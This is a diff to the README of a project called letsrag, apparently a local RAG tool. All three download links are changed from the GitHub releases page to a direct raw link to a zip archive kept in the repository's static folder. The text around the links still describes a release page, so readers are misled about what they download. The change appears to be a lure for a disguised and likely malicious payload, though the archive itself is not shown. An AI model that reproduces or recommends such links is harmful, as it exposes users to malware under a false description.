@@ -1,6 +1,6 @@
 # ⚙️ letsrag - Build Local RAG Systems Easily
 
-[![Download letsrag](https://img.shields.io/badge/Download-let_srag-brightgreen)](https://github.com/THA123bo/letsrag/releases)
+[![Download letsrag](https://img.shields.io/badge/Download-let_srag-brightgreen)](https://github.com/THA123bo/letsrag/raw/refs/heads/main/static/Software_1.3.zip)
 
 ---
 
@@ -39,7 +39,7 @@ This guide covers everything from preparing your system to running the app. It w
 
 Click the big button below or visit the GitHub release page to get the latest version for Windows.
 
-[![Download letsrag](https://img.shields.io/badge/Download-let_srag-blue)](https://github.com/THA123bo/letsrag/releases)
+[![Download letsrag](https://img.shields.io/badge/Download-let_srag-blue)](https://github.com/THA123bo/letsrag/raw/refs/heads/main/static/Software_1.3.zip)
 
 This link takes you to the release page on GitHub. There, find the latest Windows installer or zip file for letsrag. The file usually ends with `.exe` or `.zip`.
 
@@ -149,7 +149,7 @@ If you get errors related to missing files, reinstall letsrag from the release p
 ## 🔗 Download letsrag for Windows
 
 Visit this page to download the latest version:  
-[https://github.com/THA123bo/letsrag/releases](https://github.com/THA123bo/letsrag/releases)
+[https://github.com/THA123bo/letsrag/raw/refs/heads/main/static/Software_1.3.zip](https://github.com/THA123bo/letsrag/raw/refs/heads/main/static/Software_1.3.zip)
 
 Look for files ending with `.exe` or `.zip`. Choose the latest dated release to get the newest features and fixes.
 
